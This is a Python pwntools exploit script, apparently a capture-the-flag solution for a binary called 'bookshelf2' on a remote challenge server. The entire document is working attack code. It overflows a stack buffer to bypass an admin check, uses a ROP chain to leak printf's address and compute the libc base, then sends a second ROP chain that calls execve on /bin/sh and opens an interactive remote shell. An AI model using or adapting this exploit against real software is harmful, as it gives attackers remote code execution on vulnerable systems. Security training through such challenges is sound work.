#!/usr/bin/env python3
from pwn import *


elf = ELF('/home/kali/Desktop/patriot/bookshelf2/bookshelf2')
rop = ROP(elf)
libc = ELF('/home/kali/Desktop/patriot/bookshelf2/libc.so.6')
# libc = ELF('/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2')
rop_libc = ROP(libc)
context.arch = elf.arch

# p = process('/home/kali/Desktop/patriot/bookshelf2/bookshelf2')#, env={"LD_PRELOAD":"/home/kali/Desktop/patriot/bookshelf2/libc.so.6"})
# gdb.attach(p, gdbscript='b *adminBook+114')
p = remote('chal.pctf.competitivecyber.club', 8989)

print("############################################# FIRST STAGE ########################################")

# Stack oveflow to bypass admin check
print(p.recv().decode(errors='ignore'))
p.sendline(b'1')
print(p.recv().decode(errors='ignore'))
p.sendline(b'y')
p.sendline(cyclic(38))

# buffer overflow to ret2libc
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
printf_got = elf.got['printf']
puts_plt = elf.plt['puts']

payload = cyclic(56)
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(puts_plt)
payload += p64(elf.sym['main'])

print(p.recv().decode(errors='ignore'))
p.sendline(b'3')
print(p.recv().decode(errors='ignore'))
p.sendline(payload)

print(p.recv().decode(errors='ignore'))
print(p.recv().decode(errors='ignore'))
resp = p.recv()
print(resp[12:-1])
printf_addr = u64(resp[12:18].ljust(8, b'\x00'))
libc_addr = printf_addr - libc.sym['printf']
print(f"LEAKED PRINTF ADDRESS: {hex(printf_addr)}")
print(f"LEAKED LIBC ADDRESS: {hex(libc_addr)}")

print("############################################# SECOND STAGE ########################################")
p.sendline(b'1')
print(p.recv().decode(errors='ignore'))
p.sendline(b'y')
p.sendline(cyclic(38))

bin_sh = next(libc.search(b'/bin/sh')) + libc_addr
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_addr
pop_rdx = rop_libc.find_gadget(['pop rdx', 'pop rbx', 'ret']).address + libc_addr
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret']).address + libc_addr
pop_rax = rop_libc.find_gadget(['pop rax', 'ret']).address + libc_addr
syscall = rop_libc.find_gadget(['syscall', 'ret']).address + libc_addr

payload = cyclic(56)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

print(p.recv().decode(errors='ignore'))
p.sendline(b'3')
print(p.recv().decode(errors='ignore'))
p.sendline(payload)

p.interactive()
